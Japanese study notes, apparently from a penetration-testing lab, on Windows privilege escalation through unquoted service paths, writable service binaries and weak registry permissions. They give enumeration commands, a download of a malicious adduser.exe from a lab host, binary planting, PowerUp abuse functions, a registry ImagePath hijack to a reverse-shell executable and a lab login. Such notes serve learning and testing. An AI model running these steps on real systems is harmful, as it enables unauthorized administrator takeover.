引用符で囲まれていないサービスパス

サービスが開始され、プロセスが作成されると、Windowsの CreateProcess関数が使用されます。この関数の最初のパラメータ、lpApplicationNameは、実行ファイルの名前と、オプションでパスを指定するために使用されます。指定された文字列にスペースが含まれており、引用符で囲まれていない場合、関数はファイル名の終わりと引数の始まりが不明瞭なため、様々な解釈をする可能性があります。
これを悪用して、引用符で囲まれていない元のサービス呼び出しを無効にするには、悪意のある実行ファイルを作成し、解釈済みパスのいずれかに対応するディレクトリに配置し、その名前を解釈済みファイル名と一致させる必要があります。そして、サービスが開始されると、ファイルはサービス開始時と同じ権限で実行されます。
多くの場合、これはLocalSystemアカウントであり、結果として権限昇格攻撃が成功します。
```txt
# Windowsが引用符で囲まれていないサービスの正しいパスを見つけようとする例
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
```

### 脆弱なサービス列挙
Victim
#### バイナリパスを持つサービスのリスト
```powershell
# 実行中および停止中のサービスを列挙
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
```
![](assets/images/Pasted%20image%2020250702215007.png)

#### バイナリパスにスペースや引用符がないサービスのリスト
```cmd
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```

#### サービスの実行・停止権限の確認
```powershell
Start-Service GammaService
Stop-Service GammaService
```

#### Windows がサービスの実行ファイルを見つけるために使用するパスの一覧
```txt
C:\Program.exe
C:\Program Files\Enterprise.exe
C:\Program Files\Enterprise Apps\Current.exe
C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

#### パスのアクセス権を確認
```powersehll
# BUILTIN\Users:(OI)(CI)(RX,W)のように書き込み権限のあるパスを探す

icacls "C:\"
icacls "C:\Program Files"
icacls "C:\Program Files\Enterprise Apps"
```

### 権限昇格ユーザの作成
#### 悪意のあるファイルをC:\Program Files\Enterprise Apps\に配置
```powershell
iwr -uri http://192.168.45.175/adduser.exe -Outfile Current.exe
copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'

Start-Service GammaService
# Start-ServiceコマンドがWindowsがサービスを開始できないというエラーを表示したことを示しています。このエラーは、クロスコンパイルされたCコードが、元のサービスバイナリパスに残されたパラメータを受け入れないことに起因しています。しかし、Current.exeは実行され、dave2はローカルのAdministratorsグループ のメンバーとして作成されました。

net user
net localgroup administrators
```

### 自動列挙
```powershell
iwr http://192.168.45.175/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Get-UnquotedService
```

#### AbuseFunctionを使用してサービスを再起動し、権限の昇格
```powershell
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
Restart-Service GammaService

# johnが追加されていることを確認する
net user
net localgroup administrators
```

#### Practice
Kali
```bash
xfreerdp3 /u:"damian" /p:'ICannotThinkOfAPassword1!' /v:192.168.196.221 /dynamic-resolution
```

VIctim
```powershell
PS C:\Users\damian> iwr http://192.168.45.175/PowerUp.ps1 -Outfile PowerUp.ps1
PS C:\Users\damian> powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
```

```powershell
PS C:\Users\damian> . .\PowerUp.ps1
PS C:\Users\damian> Get-UnquotedService

ServiceName    : ReynhSurveillance
Path           : C:\Enterprise Software\Monitoring Solution\Surveillance Apps\ReynhSurveillance.exe
ModifiablePath : @{ModifiablePath=C:\Enterprise Software\Monitoring Solution; IdentityReference=CLIENTWK221\damian;
                 Permissions=System.Object[]}
StartName      : .\roy
AbuseFunction  : Write-ServiceBinary -Name 'ReynhSurveillance' -Path <HijackPath>
CanRestart     : True
Name           : ReynhSurveillance

PS C:\Users\damian> icacls "C:\Enterprise Software\Monitoring Solution\ReynhSurveillance.exe"
C:\Enterprise Software\Monitoring Solution\ReynhSurveillance.exe CLIENTWK221\damian:(I)(RX,W)


PS C:\Users\damian> iwr -uri http://192.168.45.175/adduser.exe -Outfile Current.exe
```
### 間違ったやり方
```powershell
PS C:\Users\damian> copy .\Current.exe "C:\Enterprise Software\Monitoring Solution\"
PS C:\Users\damian> net user

User accounts for \\CLIENTWK221

-------------------------------------------------------------------------------
Administrator            damian                   DefaultAccount
Guest                    mac                      milena
moss                     offsec                   richmond
roy                      WDAGUtilityAccount
The command completed successfully.
ユーザが追加されていない
```
### 正しいやり方
```powershell
```powershell
PS C:\Users\damian> copy .\Current.exe "C:\Enterprise Software\Monitoring Solution\Surveillance.exe"
PS C:\Users\damian> restart-service ReynhSurveillance

restart-service : Service 'ReynhSurveillance (ReynhSurveillance)' cannot be started due to the following error: Cannot
start service ReynhSurveillance on computer '.'.
At line:1 char:1
+ restart-service ReynhSurveillance
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OpenError: (System.ServiceProcess.ServiceController:ServiceController) [Restart-Service]
   , ServiceCommandException
    + FullyQualifiedErrorId : CouldNotStartService,Microsoft.PowerShell.Commands.RestartServiceCommand
```

```powershell
PS C:\Users\damian> net user

User accounts for \\CLIENTWK221

-------------------------------------------------------------------------------
Administrator            damian                   **==dave2==**
DefaultAccount           Guest                    mac
milena                   moss                     offsec
richmond                 roy                      WDAGUtilityAccount
The command completed successfully.
# サービス起動時にパスを親ディレクトリからたどるのでその途中のディレクトリ名のスペースの左側の名前に実行ファイル名を変更するとそこがパスだと勘違いして実行し、結果dave2が追加される
```

---
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """ 
#Displays services which has missing quotes, this can slo be obtained by running WinPEAS
#書き込み可能なパスを確認する
icalcs "path"
#ペイロードを書き込み可能な場所に挿入し、どちらが機能しますか。

```
sc start <servicename>
---
#### Insecure Service Executables
#Winpeas で、次のサービスを探します
File Permissions: Everyone [AllAccess]
#サービスフォルダ内の実行可能ファイルを置き換えて、サービスを開始しますsc start <service>
---
#### Weak Registry permissions
#Winpeas services info の出力で次の点を探します
HKLM\system\currentcontrolset\services\<service> (Interactive [FullControl]) #This means we have ful access

accesschk /acceptula -uvwqk <path of registry> #Check for KEY_ALL_ACCESS

#regeditからのサービス情報、実行可能ファイルを保持する変数を識別しますreg query <reg-path>

reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
#ここでは Imagepath が変数です
net start <service>